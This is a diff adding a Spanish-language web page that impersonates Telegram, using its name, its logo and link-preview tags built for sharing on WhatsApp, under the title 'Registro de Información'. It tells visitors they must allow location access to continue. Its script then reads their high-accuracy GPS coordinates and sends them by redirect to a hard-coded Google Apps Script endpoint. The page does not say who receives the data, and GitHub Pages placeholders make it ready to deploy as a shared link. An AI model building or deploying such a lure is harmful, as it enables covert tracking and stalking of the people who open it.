@@ -1,0 +1,360 @@
+```html
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0">
+
+  <title>Registro de Información</title>
+
+  <!-- =====================================================
+       OPEN GRAPH - VISTA PREVIA EN WHATSAPP
+       ===================================================== -->
+
+  <meta property="og:type"
+        content="website">
+
+  <meta property="og:title"
+        content="Registro de Información">
+
+  <meta property="og:description"
+        content="Acceso al sistema de registro de información">
+
+  <meta property="og:image"
+        content="https://TU-USUARIO.github.io/TU-REPOSITORIO/Telegram.png">
+
+  <meta property="og:url"
+        content="https://TU-USUARIO.github.io/TU-REPOSITORIO/">
+
+  <meta property="og:site_name"
+        content="Sistema de Registro">
+
+  <!-- =====================================================
+       TWITTER / X CARD
+       ===================================================== -->
+
+  <meta name="twitter:card"
+        content="summary_large_image">
+
+  <meta name="twitter:title"
+        content="Registro de Información">
+
+  <meta name="twitter:description"
+        content="Acceso al sistema de registro de información">
+
+  <meta name="twitter:image"
+        content="https://TU-USUARIO.github.io/TU-REPOSITORIO/Telegram.png">
+
+
+  <style>
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+
+      margin: 0;
+      padding: 0;
+
+      width: 100%;
+      height: 100%;
+
+      font-family: Arial, Helvetica, sans-serif;
+
+      background: #111827;
+
+    }
+
+
+    /*
+    Pantalla de carga
+    */
+
+    .pantalla {
+
+      width: 100%;
+      height: 100vh;
+
+      display: flex;
+
+      justify-content: center;
+
+      align-items: center;
+
+      flex-direction: column;
+
+      color: white;
+
+      text-align: center;
+
+      padding: 20px;
+
+    }
+
+
+    .logo {
+
+      width: 180px;
+
+      max-width: 70%;
+
+      margin-bottom: 25px;
+
+      border-radius: 18px;
+
+      box-shadow:
+        0 10px 35px rgba(0,0,0,0.40);
+
+    }
+
+
+    h1 {
+
+      margin: 0 0 10px 0;
+
+      font-size: 25px;
+
+    }
+
+
+    p {
+
+      margin: 0 0 25px 0;
+
+      color: #d1d5db;
+
+    }
+
+
+    .boton {
+
+      border: none;
+
+      background: #2563eb;
+
+      color: white;
+
+      padding: 14px 30px;
+
+      border-radius: 8px;
+
+      font-size: 16px;
+
+      font-weight: bold;
+
+      cursor: pointer;
+
+    }
+
+
+    .boton:hover {
+
+      background: #1d4ed8;
+
+    }
+
+
+    .mensaje {
+
+      margin-top: 20px;
+
+      color: #fca5a5;
+
+      display: none;
+
+    }
+
+  </style>
+
+</head>
+
+
+<body>
+
+
+  <div class="pantalla">
+
+    <!-- Imagen Telegram -->
+
+    <img
+      class="logo"
+      src="Telegram.png"
+      alt="Telegram"
+    >
+
+
+    <h1>
+      Registro de Información
+    </h1>
+
+
+    <p>
+      Para continuar, permita el acceso a su ubicación.
+    </p>
+
+
+    <button
+      class="boton"
+      onclick="obtenerUbicacion()">
+
+      CONTINUAR
+
+    </button>
+
+
+    <div
+      id="mensaje"
+      class="mensaje">
+
+    </div>
+
+  </div>
+
+
+  <script>
+
+    /*
+    =====================================================
+    URL DEL GOOGLE APPS SCRIPT
+    =====================================================
+    */
+
+    const URL_APPS_SCRIPT =
+      "https://script.google.com/macros/s/AKfycbwaeaYAFwqOErwaqhalBnXr7WCKkzVm-OOwxe7yxVLstnnM1jbaO2PXY6rwxgU6IMgtSg/exec";
+
+
+    /*
+    =====================================================
+    OBTENER UBICACIÓN
+    =====================================================
+    */
+
+    function obtenerUbicacion() {
+
+
+      const mensaje =
+        document.getElementById("mensaje");
+
+
+      /*
+      Comprobar compatibilidad
+      */
+
+      if (!navigator.geolocation) {
+
+        mensaje.innerText =
+          "Este navegador no permite obtener la ubicación.";
+
+        mensaje.style.display = "block";
+
+        return;
+
+      }
+
+
+      /*
+      Solicitar ubicación
+      */
+
+      navigator.geolocation.getCurrentPosition(
+
+        function(posicion) {
+
+
+          const latitud =
+            posicion.coords.latitude;
+
+
+          const longitud =
+            posicion.coords.longitude;
+
+
+          /*
+          Redireccionar al Apps Script
+          */
+
+          const url =
+            URL_APPS_SCRIPT +
+            "?latitud=" +
+            encodeURIComponent(latitud) +
+            "&longitud=" +
+            encodeURIComponent(longitud);
+
+
+          window.location.href = url;
+
+
+        },
+
+
+        function(error) {
+
+
+          switch (error.code) {
+
+
+            case error.PERMISSION_DENIED:
+
+              mensaje.innerText =
+                "Debe permitir el acceso a la ubicación para continuar.";
+
+              break;
+
+
+            case error.POSITION_UNAVAILABLE:
+
+              mensaje.innerText =
+                "No fue posible determinar su ubicación.";
+
+              break;
+
+
+            case error.TIMEOUT:
+
+              mensaje.innerText =
+                "La solicitud de ubicación tardó demasiado.";
+
+              break;
+
+
+            default:
+
+              mensaje.innerText =
+                "No fue posible obtener la ubicación.";
+
+          }
+
+
+          mensaje.style.display = "block";
+
+        },
+
+
+        {
+
+          enableHighAccuracy: true,
+
+          timeout: 15000,
+
+          maximumAge: 0
+
+        }
+
+      );
+
+    }
+
+  </script>
+
+
+</body>
+
+</html>
+```
+
